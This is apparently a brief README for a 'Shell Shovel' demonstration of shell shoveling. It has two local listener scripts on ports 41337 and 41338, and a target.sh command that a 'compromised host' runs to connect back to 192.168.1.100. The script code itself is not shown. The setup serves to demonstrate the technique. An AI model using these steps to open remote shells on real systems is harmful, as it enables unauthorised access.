Shell Shovel
============

I put this together to demonstrate shell shoveling.

## Running the demo

On your localhost run shovel-input.sh and shovel-display.sh

Be sure your iptables rules are set to allow access to the ports.

For the sake of demonstration we will localhost is at 192.168.1.100

### In terminal window 0x1

./shovel-input.sh 41337

### In terminal window 0x2

./shovel-display.sh 41338

### From the remote/compromised host

./target.sh 192.168.1.100 41337 41338 



